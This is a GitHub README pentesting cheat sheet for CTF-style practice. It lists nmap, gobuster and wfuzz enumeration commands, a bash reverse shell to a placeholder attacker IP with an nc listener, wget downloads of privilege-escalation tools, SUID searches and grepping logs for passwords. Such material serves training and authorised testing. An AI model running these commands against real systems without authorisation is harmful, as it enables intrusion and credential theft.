# Pentesting CheatSheet
  Dont forget to check out my other repositories and my HTB profile! :) 
  
  [<img src="https://www.hackthebox.eu/badge/image/358843" width="300"/>](https://www.hackthebox.eu/home/users/profile/358843)
  
  
  [![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=CyberHashky&repo=CTF-CheatSheet)](https://github.com/CyberHashky/CTF-CheatSheet)
  
    
&nbsp;
---
&nbsp;


# Contents 

  - ## [Ennumeration](https://github.com/CyberHashky/Pentesting-CheatSheet/blob/main/README.md#1-ennumeration)
  - ## [Explotation techniques](https://github.com/CyberHashky/Pentesting-CheatSheet/blob/main/README.md#2-explotation-techniques)
  - ## [Inside the system](https://github.com/CyberHashky/Pentesting-CheatSheet/blob/main/README.md#3-inside-the-system)
  - ## [Privilege escalation](https://github.com/CyberHashky/Pentesting-CheatSheet/blob/main/README.md#4-privilege-escalation)
  

&nbsp;  
---
&nbsp;


# CheatSheet
  ## 1. Ennumeration
   >Identify the different services located on the target machine</span>
   
  ###  Ports
   Basic port scan with nmap
 ```md
    $nmap {IP} 
 ```
    
   Advanced scan with nmap
 ```md
    $nmap -sV -sC -p- -O {IP} 
 ```
  
  ###  Web
   ####  Identifying services and versions
   - Searching inside the webpage
   - Nmap version detection scripts
   - Wappalyzer extension
     
   ####  Directories
   - Gobuster: find directories and files
   ```md
    $gobuster dir -x "php,txt,html" -t 100 -w  ~/Descargas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://WEBPAGE
   ```
   - Wfuzz
   Find custom directories or files
   ```md
    $wfuzz -w ~/Descargas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 403,404,302 http://WEBPAGE.FUZZ or http://WEBPAGE.FUZZ.txt 
   ```
   Fuzzing post
     ```md
     $ wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"  --hc 403,404,302 http://WEBPAGE/login.php
     ```
  
  #### Virtual domains
   - Reverse DNS lookup
   ```md
      site:*.sitename.com
      $dig +noall +answer -x IP
   ```
  
      
  ###  Others
   Dont forget to note any possible interesting users, data, passwords...
   Use extensions & services (hunter, theharvester...) to get emails or info\
 
  &nbsp;
      
  ## 2. Explotation techniques
  > Different techniques to try to gain access to the system
  ### Website with file uploads
  ### Logins
  ### ...
  
  &nbsp;
   
  ## 3. Inside the system
  > Once we have RCE we can get into the system
   - Basic reverse shell
   ```md
    $nc -lvp 1234
    $bash -i >& /dev/tcp/MYIP/1234 0>&1
   ```
   - Upgrade shell
   ```md
    $python3 -c 'import pty; pty.spawn("/bin/bash");'
   ```
   - Get a better shell with ssh
   ```md
    [add RSA keys]
   ```
   &nbsp;
   
  ## 4. Privilege Escalation
   > Search for misconfigurations or leaked credentials that we can use to get a user with more permissions
  - Check if we can abuse sudo permissions
   ```md
    $sudo -l
   ```
  - Upload privesc checkers
   ```md
    $wget http://IP:9090/linpeas.sh
    LinEnum
    UnixPrivEsc
   ```
   - Search for software that we can exploit
   ```md
    /usr/local/ or /usr/local/src or /usr/local/bin or /usr/src/
    /opt/
    /home/
    /var/
   ```
   - [GTFO Bins](https://gtfobins.github.io/)
   - See running processes
   ```md
    $ps -aux
    $wget http://IP:9090/pspy64
    $crontab -l
    $ls -la /etc/cron.d
   ```
   - Find SUID files
   ```md
    $find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \
    $find / -uid 0 -perm -4000 -type f 2>/dev/null
   ```
   - Search for info in logs (passwords, users, SQL credentials...)
   ```md
    $cd /var/logs
    $cat * | grep pass
    $cat * | grep root/username
   ```
   - Find writeable files
   ```md
    $find / -perm -o w -type d 2>/dev/null
    $find / -uid 0 -perm -4000 -type f 2>/dev/null
   ```
   
   - If there's a webpage -> undersand it (search for phps, software...)
   ```md
    $cd /var/www    or    $cd /opt
    $cat files
   ```
   ### Kernel exploits
   - DirtyCow
   
 &nbsp;
--- 
 &nbsp;




